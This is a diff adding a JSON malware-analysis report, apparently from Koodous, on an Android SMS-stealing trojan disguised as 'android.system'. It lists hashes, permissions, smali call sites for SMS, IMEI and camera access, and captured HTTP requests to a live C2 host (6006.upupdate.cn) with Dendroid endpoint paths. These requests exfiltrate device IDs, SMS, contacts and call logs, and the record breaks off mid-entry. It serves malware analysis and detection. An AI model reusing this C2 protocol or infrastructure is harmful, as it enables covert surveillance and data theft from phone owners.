@@ -1,0 +1,838 @@
+{
+    "apk_info": {
+        "id": "bxP3db22klQdLezX",
+        "url": "https://developer.koodous.com/apks/93435215bdc22e1e27369dd4347edb77d99f585313dc98dfc7f1a4e31ed10c9e/",
+        "sha256": "93435215bdc22e1e27369dd4347edb77d99f585313dc98dfc7f1a4e31ed10c9e",
+        "md5": "31f7caec68c433eaf988ff22aa80469a",
+        "sha1": "d56ec882a1d2e9176c13c3fa46677ead65060347",
+        "app": "android.system",
+        "package_name": "com.huawei.lucky_money",
+        "company": "Android",
+        "version": "9.9.9.9",
+        "image": "https://developer.koodous.com/media/apk_images/11/cf/11cf7be3879cf4cebc6396ba7bac96d8117a28bfe45b159a6aedae9187a594c5",
+        "size": 243242,
+        "tags": [
+            "sms-thief",
+            "reflection",
+            "carbonsteal",
+            "trojan",
+            "svpeng"
+        ],
+        "is_trusted": false,
+        "is_installed": false,
+        "rating": -3,
+        "is_detected": true,
+        "is_corrupted": false,
+        "last_scan": null,
+        "is_static_analyzed": true,
+        "is_dynamic_analyzed": true,
+        "is_false_positive": false,
+        "last_yara_analysis_at": null,
+        "matches_count": 17,
+        "comments_count": 1,
+        "votes_count": 3,
+        "created_at": "2018-12-29T23:18:48+01:00",
+        "updated_at": "2023-03-30T17:22:23.107061+02:00"
+    },
+    "static_analysis": {
+        "cuckoo": {
+            "target": {
+                "file": {
+                    "md5": "31f7caec68c433eaf988ff22aa80469a",
+                    "sha1": "d56ec882a1d2e9176c13c3fa46677ead65060347",
+                    "size": 243242,
+                    "crc32": "E18ACDB5",
+                    "sha256": "93435215bdc22e1e27369dd4347edb77d99f585313dc98dfc7f1a4e31ed10c9e",
+                    "sha512": "a3ea84a369e461208f6c539d2fd0b4c771472805f74b526776739d1f9c35736fd47c1a7d8eca3ee4ae17871a345a36ccf18fc285b011a457ae0aedf57e22b145",
+                    "ssdeep": "3072:gzoQ3LP1sfSkV+0XRyEkSfpm3QSWAYR4LRj+jsmFqGn5WDGFSbcL2Z7q2x3wwg:QLLdQPRURrWAYGagJGnilbd3wF"
+                },
+                "category": "file"
+            },
+            "network": {
+                "dns": [
+                    {
+                        "type": "A",
+                        "answers": [],
+                        "request": "6006.upupdate.cn"
+                    },
+                    {
+                        "type": "A",
+                        "answers": [
+                            {
+                                "data": "150.129.82.138",
+                                "type": "A"
+                            }
+                        ],
+                        "request": "6006.upupdate.cn"
+                    }
+                ],
+                "irc": [],
+                "http": [],
+                "smtp": [],
+                "hosts": [
+                    "150.129.82.138"
+                ],
+                "domains": [
+                    {
+                        "ip": "150.129.82.138",
+                        "domain": "6006.upupdate.cn"
+                    }
+                ]
+            }
+        },
+        "androguard": {
+            "urls": [
+                "https://6006.upupdate.cn:8443/Dendroid",
+                "http://loc.map.baidu.com/sdk.php"
+            ],
+            "dexes": {
+                "classes": {
+                    "sha256": "003c94fe8db9b68b34619d0b37651feb455f4b677c01bc7ddbaf617e984daeaf",
+                    "ssdeep": "3072:tjSad76m9CQs6Sn7V6JsRgtrp/l58PSSIBBUnYseqS95ekyDZDKyzr3i4cnQmwC9:tjZ6IQk6g5eZDFiCmlU21gqxBtpJ"
+                }
+            },
+            "api_key": {
+                "com::baidu::lbsapi::API_KEY": "PXsiLluomfpDGi4HkYCBCgG2g0ZDANfm"
+            },
+            "cordova": "",
+            "filters": [
+                "android.intent.action.PHONE_STATE",
+                "android.app.action.DEVICE_ADMIN_ENABLED",
+                "android.intent.action.MAIN",
+                "android.intent.action.BOOT_COMPLETED"
+            ],
+            "app_name": "android.system",
+            "services": [
+                "com.huawei.lucky_money.RobMoneyService",
+                "com.huawei.lucky_money.service.AliveJobService",
+                "com.huawei.lucky_money.BaseNotificationListener",
+                "com.baidu.location.f"
+            ],
+            "wearable": false,
+            "androidtv": false,
+            "libraries": [],
+            "providers": [],
+            "receivers": [
+                "com.huawei.lucky_money.receiver.MyDeviceAdminReceiver",
+                "com.huawei.lucky_money.BootBroadcastReceiver",
+                "com.huawei.lucky_money.receiver.PhoneListener"
+            ],
+            "activities": [
+                "com.huawei.lucky_money.MyCameraActivity",
+                "com.huawei.lucky_money.MainActivity",
+                "com.huawei.lucky_money.activity.Camera2Activity",
+                "com.huawei.lucky_money.activity.MyCameraActivity",
+                "com.huawei.lucky_money.TsetActivity"
+            ],
+            "certificate": {
+                "sha1": "61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81",
+                "serial": "936EACBE07F201DF",
+                "issuerDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_after": "Jul 17 01:33:46 2035 GMT",
+                "subjectDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_before": "Feb 29 01:33:46 2008 GMT"
+            },
+            "permissions": [
+                "android.permission.ACCESS_FINE_LOCATION",
+                "android.permission.RECEIVE_SMS",
+                "android.permission.READ_EXTERNAL_STORAGE",
+                "android.permission.RECEIVE_BOOT_COMPLETED",
+                "android.permission.INTERNET",
+                "android.permission.SEND_SMS",
+                "android.permission.ACCESS_WIFI_STATE",
+                "android.permission.PROCESS_OUTGOING_CALLS",
+                "android.permission.CAMERA",
+                "android.permission.WRITE_SMS",
+                "android.permission.READ_CALL_LOG",
+                "android.permission.CHANGE_WIFI_STATE",
+                "android.permission.ACCESS_NETWORK_STATE",
+                "android.permission.READ_PHONE_STATE",
+                "com.android.browser.permission.READ_HISTORY_BOOKMARKS",
+                "android.permission.RECORD_AUDIO",
+                "android.permission.ACCESS_COARSE_LOCATION",
+                "android.permission.WRITE_EXTERNAL_STORAGE",
+                "android.permission.READ_CONTACTS",
+                "android.permission.READ_SMS"
+            ],
+            "package_name": "com.huawei.lucky_money",
+            "version_code": "9",
+            "main_activity": "com.huawei.lucky_money.TsetActivity",
+            "signature_name": "META-INF/CERT.RSA",
+            "functionalities": {
+                "SMS": [
+                    {
+                        "code": "invoke-virtual/range v0 ... v5, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Landroid/app/PendingIntent; Landroid/app/PendingIntent;)V",
+                        "class": "Lcom/huawei/lucky_money/BaseNotificationListener;",
+                        "method": "a"
+                    }
+                ],
+                "mcc": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/e/a;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/e/a;",
+                        "method": "c"
+                    }
+                ],
+                "ssl": [
+                    {
+                        "code": "const-string v5, 'https'",
+                        "class": "La/a/e/d;",
+                        "method": "<clinit>"
+                    },
+                    {
+                        "code": "const-string v1, 'https'",
+                        "class": "La/a;",
+                        "method": "<init>"
+                    },
+                    {
+                        "code": "const-string v3, 'https'",
+                        "class": "La/a;",
+                        "method": "<init>"
+                    }
+                ],
+                "imei": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "f"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/BaseNotificationListener;",
+                        "method": "onStartCommand"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/e/a;",
+                        "method": "a"
+                    }
+                ],
+                "imsi": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/e/a;",
+                        "method": "b"
+                    }
+                ],
+                "camera": [
+                    {
+                        "code": "invoke-virtual v0, v1, v2, v3, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback; Landroid/hardware/Camera$PictureCallback; Landroid/hardware/Camera$PictureCallback;)V",
+                        "class": "Lcom/huawei/lucky_money/MyCameraActivity;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v2, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V",
+                        "class": "Lcom/huawei/lucky_money/MyCameraActivity;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/hardware/Camera;->startPreview()V",
+                        "class": "Lcom/huawei/lucky_money/MyCameraActivity;",
+                        "method": "a"
+                    }
+                ],
+                "crypto": [
+                    {
+                        "code": "invoke-virtual v0, v1, Ljava/security/MessageDigest;->digest([B)[B",
+                        "class": "Lb/f;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v1, Ljava/security/MessageDigest;->digest()[B",
+                        "class": "Lcom/baidu/location/c;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Ljava/security/MessageDigest;->digest()[B",
+                        "class": "Lcom/huawei/lucky_money/a/x;",
+                        "method": "a"
+                    }
+                ],
+                "socket": [
+                    {
+                        "code": "invoke-virtual v0, v1, v2, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener; I)V",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v1, v4, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener; I)V",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "d"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v1, v4, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener; I)V",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "f"
+                    }
+                ],
+                "runbinary": [
+                    {
+                        "code": "invoke-static Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;",
+                        "class": "Lcom/huawei/lucky_money/BaseNotificationListener;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v3, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;",
+                        "class": "Lcom/huawei/lucky_money/BaseNotificationListener;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-static Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;",
+                        "class": "Lcom/huawei/lucky_money/MainActivity;",
+                        "method": "c"
+                    }
+                ],
+                "phonenumber": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/e/a;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/e/a;",
+                        "method": "a"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/huawei/lucky_money/e/a;",
+                        "method": "a"
+                    }
+                ],
+                "dynamicbroadcastreceiver": [
+                    {
+                        "code": "invoke-virtual v0, v1, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "c"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v1, v4, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "d"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v1, v4, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;",
+                        "class": "Lcom/baidu/location/e;",
+                        "method": "f"
+                    }
+                ]
+            },
+            "max_sdk_version": "",
+            "min_sdk_version": 15,
+            "new_permissions": [],
+            "displayed_version": "9.9.9.9",
+            "target_sdk_version": 22
+        }
+    },
+    "dynamic_analysis": {
+        "droidbox": {
+            "dns": [
+                {
+                    "ip": "150.129.82.138",
+                    "hostname": "6006.upupdate.cn"
+                }
+            ],
+            "recvnet": [],
+            "sendnet": [
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 905e389be676319ecc85673556d342f3138348b54ac5b1b4a6a3a6c0df3cac4131ea845df7cbd435a1e67b179a3759f6867143b996ee6dc16a12568e221de38d44a9b19ee7074ecfc01f91143a07a47f330801f593b2ad095aa99b5f9440db829865509966ee1f15564746a1ce8e7188849953ecabb810d2614f7bac04a7107bad8fafb00c1bc13e7823951b27b7e3ede8b17011b51dec27efb12ad79a562181268b635616438d265d95d4d5946f5142cbc1f842f6159f1aa4795fd56fdf932fe4ea493a2c98dc5eb1f92d3698999c25cbbb7c1c507d2e1852d1043dae7d338f169263e676785eee324d3202746f485e83cf7125d9741230bd282faedd04fb8c\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\nc1b1af12e6c71a6e1df432fdf54bfda4fbfa16380454064bbcf2b9b67da688b02a823c50203dc4b9a1a35ca703fca15b57322296c41eb615a5f8c81fb86ef0a4a96dc7764714fbbfaab090db7",
+                    "time": 12.57296,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 1a881966310bdeb2404b5ae9bbb279e4cfeeb9fcd05e04ab3e3b17787e717e7135d26342bb0d40eaf42cafa596522602a9989807f7fef640d380295ddb9b1abb2de8fc3f84ac310353a298c7772ff0d143b3b4be5d753f2594020b7d72b1dc8fbabe0ce4145d4d0d61101f204fec417948ef116773fa1ae5b396891e3db591fd38a84d5abae4dd0e57b17d932aa15ebebac258738a4990645c4be64249efe305dfa3a5fbd93686826d399b183396013cbec9f1bd02f0e65a08e995dba08b8e413e81e544ca531ab86fe97aa9dbf797a7d689fb2878fd021683f10ae2053e8966c991184cc98871b53b1a8f4ab7406fcfa499c6552e6b5a08208a8b912eec3086\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n7b994c65b1eeaf41567e39e8510ad9a52500789defe9ed6b5cd6e8097b7dd4dbb7aee31033d4056de441956534be83d16c6e044c26ced958b222acadfb637105d247c00fd7c1d9d5df215966e",
+                    "time": 36.409211,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705909536,
+                    "data": "POST /Dendroid/contactManager/addContact HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 74119a36bee0cfe10c05efee60d7c5e02686191a648d8fc946621253d9887890d19e83cfbd79422acbca6ffbdc338fbb234aa98ee7cf76f9bba03a4f35a1ab3a0d959d178b37bcc30ddc6efaa856af12a0ab260618a17cdd5697e1f839b09220b1004badbb151030d89b0de75b20aa06d1631bdfed3ab2f5bc267985e4e7e20fcea69b0eaf485e2b7e7567eba7dedbc0228aea1edc25951a7ce85a6999cef17c1f78f0014c984d30913b41a4402078372dcf9373f148780fd439fd45a79950cde02a7b1faf9ddb153f6c118de43c65d7139305db93ffe862d4086310dc86aabd18dd7d34fd7261fb5b0bea711db5e87f82544c8fc1427550d82f5fdfeb592f0c\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 76\r\n\r\nbbe8146cb4ce775e92158f832ac40965d72a9aa44c6cc1f2b9bd30efe388bb745255dd1dc45c",
+                    "time": 38.572003,
+                    "dataleak": [
+                        "TAINT_IMEI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705897888,
+                    "data": "GET /Dendroid/datacipher/getRsaKey HTTP/1.1\r\nHost: 6006.upupdate.cn:8443\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nUser-Agent: okhttp/3.9.1\r\n\r\n",
+                    "time": 5.952658,
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 83c9f9a6def91c7301bce6beed95e18883ad6431a07243b03606b1fe6f688ade3f03a54d1d7cbda64d35f262356d10a0c47e9875482ef634fe982eacd9728ae70ec0049847e3ae3ea0c30878cd812ae2446572ada3dfde2950d5c9948afba98e453d38f88b0e4bdd0811b61d08fd6198fb6ca4c31007cb3bcad8a06ddfaea43530b97c75fa07601d7f0e806c7ec50d55fdcbca3716956bbe0f3255185ee2c2186000753c9a0b41c847cb16129a6efe94a117eedf40be34f69550d8f49226073e31d1d94731ce6ec9d6ecdba4d64b53d716e38dc585b5b9bf90587f7986e54ebfc1b15c22cce960ae16be1fc2973946e10dc2d2d05cb838fbed079bc8918fa0ff\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n76619b4be977a72ab337a56003baaff068defe871126cd532eab56c0d8d63135b0c1562d950939f9a7056e176c3bede64bdb8ae92252bd68b42bdbf4d372040884c99f46fd60f0aa00a82f340",
+                    "time": 48.513816,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705945024,
+                    "data": "POST /Dendroid/smsManager/addSms HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: a155c52db05d1754773445cc1472e76be7cfc2a1c44a7a70e3bfba96d2b6d94af0f854cc973552979056a0f93d2bd7ad1f4efaa7cc222aa00c6c378dae3b003a150c18fd15b26f2330825fbb1420b166fbeb8f087c69a788553e0d41166f98ced19c526759bce118787367b106af6e2faf35ec8b523922f8855685bd60e6c30dc55b406118f2d68acac67a7fb6c08da21d60dc3c175476d5533dda6466b39a4fae0b65238efa4a00b1964f130cda18bdcb0e23bf1f46a92b96b79010aea405ca6e2529624de7cd8e5d775199f21ec6521923b934fd53d1a5577ede378207b63a95e2496789eb6cfb05f77fa55fee7c1840a35173a393b342e71b275a9082fcb5\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 70\r\n\r\n313bd6112a69bbf7babea4ccd0ab44fce1e89989e58a2aca2462cae63dab1ab65244f4",
+                    "time": 26.432231,
+                    "dataleak": [
+                        "TAINT_IMEI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 706255624,
+                    "data": "POST /Dendroid/objectManager/addObjects HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 4bb881902ac760c020cc1ab161cf059cf395cba144ea7cdcb2d656b7af0c34c070d6b42faa7769380add66be7ce6b751110e8f059f8335b9005b136f6de5d75de95a0a3ff227d54b99d478229c8ecf3463b90212bd1c95e4765b8d8c8bb045a0d3c769b2f60d1d0667471143cde99fd8f481b508e39900f07cc3a02b4f548950ce13a357a0d470e6f30d580bf543f59fd12d58c011309699e9d26317ae526b7126fe38be41e749d7990518f1d5bfccdf25bbdc4be85634a8b43ac15e34c22d932aa827a62414555e5df7d1cbcd6dd877919de01a78f40a1e32ea17a9d8545bca9113591b8b247401942e8f04f9609f42435440002e4bb6032742ea01cfbbadc0\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 1014\r\n\r\nf7d5635b397c991145bd51e390323bb3d7985ea82e6c3ecf47cf968905277c726e44ffc244bcb60cbf39eeaee69edca4f0da0659d4c69c6fe146871ba37a2d26c69de797955150ec3bf37573f",
+                    "time": 14.757789,
+                    "dataleak": [
+                        "TAINT_PHONE_NUMBER",
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705887632,
+                    "data": "POST /Dendroid/callLogManager/addCallLog HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 96fee79c6b862f578fe3e259b48e6e790c78ea17eadf51266e9aa37dc0f6085aac7fcecb6bc0bcfe1d8753257dff897296338d7803d1bf07baffc3692baf5eef3389e805b2a6bc732648ec2266a2e44dcbb8af3e19d64c10ec9c993ddaa19a20d640c9ea984cd1849f8bc1ec25d6670f8bb03c4e80d3ab71ffe4c115fd49cc5afabc8b3ed2a3da603919ca3ec527948d829f8eeccf2d6ae6498b988299bcfa82f89d216feb920e7beb3f5eb26d26f96ff7153820a90c8f4ef45c6ac6456a446930567eb41de4b9fa2cb6f0d83659fd1e803670a8af4933519577b96e77a48f04eb8dc8115dcbba6f7c44e14c7f701c82c4e4283170f6ff40731fcc00e78b4778\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 84\r\n\r\naf63552c36fa0f2ff3045b274c7027ea46117d969900b8440dfa770610578b4274f32182b472900f9577",
+                    "time": 50.331934,
+                    "dataleak": [
+                        "TAINT_IMEI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 522d74b9b8dfdf44b191e8508dfd8e45e865f164299a4319f01c87e7c5a006c0033f742fd032080c9997026af7e696018ba348781e2d9297167f97752753658eb1ceb00a9a856dbc682279e20238250d8ee82a705695eb6d6b74110f355179dd126d05db51ee6bdb36105b0e5bf0c2e109befec180a9229d8ca18c59404d920ccb033b298e929698dd2e53ce6a5989729817dfcd4fb2f90ed2e29a43fcf6612cf78bf0905c29bd4e91977bce3935513338547323ba0fa7612987c7916fb4a4c02fe730c1e1e664cef242258ddf6c5174dcf2d6412018bf24429d8ff7fce1ff74dbdc5eb2e5fb49bd86442349bddd6b73376c762f02cb763df15e6ea8b4384950\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n8c5c9d4b61d76593726c8a1a6eaee570faa677bd8eda43f36299e169240ca97952683cc1aeb768e164c4ce1d6d1b0f5987f78033d71c0e2e031e7c0b4be6e46d17da83c6f1ac9f00250e98f57",
+                    "time": 24.542158,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/objectManager/addObjects HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: a3e38449b3a24365d6cefc4cf58ac3288d68d008b753d02cd3b6151b3b5b813fd530941a8641cc2e2cbdeb63fae74cf5b08df32a47d56e908f6010782b36824d760054383b760eaa4917ee3793d80372b503ec958561bd49d8dd70661af005c1a377376ebf278cbb7dbbf7e577d31d89149ab4dbc67c8daefea89a0f77d2fbc54cb6c4e269ed9997694232b5147105d4874852bf9b1ec4fde2fa4e4919be9b6d0717af351c748cf9f2fe7c88007f10b4cb2c8926ba8e16c49f89b2f47f69e17eeafd6c0bf8cbaab18c03c44f264b52303f883b927ca5d202780f3c6e92fcf36fe772ba5e518af2a36ad0837af3ccaef052b559cc9a0a774049f0023a2f6ef5b0\r\narg1: 6797db2b30200cdfd42278279dc4f7cb\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 6006.upupdate.cn:8443\r\nAccept-Encoding: gzip\r\nContent-Length: 982\r\n\r\nf7d5635b397c991145bd51e390323bb3d7985ea82e6c3ecf47cf968905277c726e44ffc244bcb60cbf39eeaee69edca4f0da0659d4c69c6fe146871ba37a2d26c69de797955150ec3bf37573f0",
+                    "time": 14.742132,
+                    "dataleak": [
+                        "TAINT_PHONE_NUMBER",
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "6006.upupdate.cn",
+                    "destport": 8443,
+                    "processname": "com.huawei.lucky_money"
+                }
+            ],
+            "sendsms": [],
+            "dexclass": [
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "path": "/data/app/com.huawei.lucky_money-1.apk",
+                    "time": 0.084827,
+                    "processname": "com.huawei.lucky_money"
+                }
+            ],
+            "filesread": [
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "36763e1b02f448df57991c424e01e0f4144c546a",
+                    "name": "/dev/urandom",
+                    "time": 23.382199,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "bcc6f7dcd29abf01a44968faaef1fa86e4acc400",
+                    "name": "/dev/urandom",
+                    "time": 47.321429,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705897888,
+                    "data": "11e0e8a32cd62fdea1e10c38852784c9d802936a",
+                    "name": "/dev/urandom",
+                    "time": 5.107531,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "504b0506000000001200120033050000e1b003000000504b01021400140008080800cb79984de3e68fb665020000150500001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800cb79984dcb42b42b960200004a0500001000000000000000000000000000ab0200004d4554412d494e462f434552542e5346504b01021400140008080800cb79984dc855fd4181040000b206000011000000000000000000000000007f0500004d4554412d494e462f434552542e525341504b01021400140008080800cb79984d9e26425664090000b826000013000000000000000000000000003f0a0000416e64726f69644d616e69666573742e786d6c504b01020a000a00000800000040210062df48f24c1700004c1700002400000000000000000000000000e41300007265732f6472617761626c652d686470692d76342f69635f6c61756e636865722e706e67504b01021400140008080800cb79984d55e0da58cd0000006c0100001c00000000000000000000000000722b00007265732f6c61796f75742f61637469766974795f6d61696e2e786d6c504b01020a000a000008000000402100d9df846a280c0000280c00002400000000000000000000000000892c00007265732f6472617761626c652d6d6470692d76342f69635f6c61756e",
+                    "name": "/data/app/com.huawei.lucky_money-1.apk",
+                    "time": 0.136379,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705909536,
+                    "data": "0e88e52edf3defe1541eacf3df154628e786c07e",
